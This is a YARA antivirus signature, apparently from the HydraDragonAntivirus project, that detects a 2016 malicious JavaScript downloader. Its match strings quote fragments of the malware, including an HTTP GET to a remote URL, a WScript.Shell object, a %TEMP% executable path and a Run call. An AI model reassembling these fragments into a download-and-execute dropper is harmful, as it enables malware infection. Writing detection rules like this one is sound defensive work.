rule sig_20160330_aa04d271a65201c63283afbc30d610e5 {
  meta:
    description = "datamaliciousorder - file 20160330_aa04d271a65201c63283afbc30d610e5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c800cf66cb0cc8db46fa56d0cec9a17d866e1510ac64f96c16f001cf908410e8"

  strings:
    $s1  = "ZB[R0](\"GET\", \"http://greenbee.com.ua/b7eosa\", false);" fullword ascii
    $s2  = "var V = function WJ() {return WScript[OK](\"WScript\"+\".Shell\");}(), OM = 11;" fullword ascii
    $s3  = "function Q(NP, G){I0 = I0 * 1; return NP - G;};" fullword ascii
    $s4  = "if (ZB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function P() {return V[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"64K2JU51.ex\" + \"e\";};" fullword ascii
    $s6  = "function U(){return PD + \"\";};" fullword ascii
    $s7  = "function I() {return ((W == true) && (W == OW)) ? 1 : I0;};" fullword ascii
    $s8  = "function YD(M0){V[\"Run\"](M0, I0, I0);};" fullword ascii
    $s9  = "function D(){return 22;};" fullword ascii
    $s10 = "function YS()" fullword ascii
    $s11 = "}while (J);" fullword ascii
    $s12 = "return Q(AD, F);" fullword ascii
    $s13 = "var VP = new this[\"Date\"]();" fullword ascii
    $s14 = "function HV(M) {var ZV = (1, 2, 3, 4, 5, M); return ZV;};" fullword ascii
    $s15 = "function R(){return OK;};" fullword ascii
    $s16 = "var W = false;" fullword ascii
    $s17 = "W = true; " fullword ascii
    $s18 = "var R2 = false;" fullword ascii
    $s19 = "OW = true; " fullword ascii
    $s20 = "var OW = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}